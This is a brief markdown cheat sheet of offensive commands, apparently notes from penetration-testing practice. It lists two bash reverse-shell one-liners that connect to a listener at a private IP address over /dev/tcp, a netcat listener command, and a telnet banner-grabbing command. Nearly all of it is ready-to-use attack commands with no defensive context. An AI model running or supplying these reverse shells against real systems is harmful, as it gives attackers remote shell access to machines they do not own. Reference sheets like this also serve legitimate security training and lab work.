|**Reverse shells** |**Description**|
|---|---|
|`bash -i >& /dev/tcp/192.168.119.3/4444 0>&1` |Common reverse shell |
|`bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"` |If prior shell doesn't work due to Bourne Shell |

| **Netcat listener** | **Description** |
| ---- | ---- |
| `nc -nvlp 9001` | In port 9001 |

| **Banner grabbing** | **Description** |
| ---- | ---- |
| `telnet 10.10.10.10 22` | For ip 10.10.10.10 in port 22 |
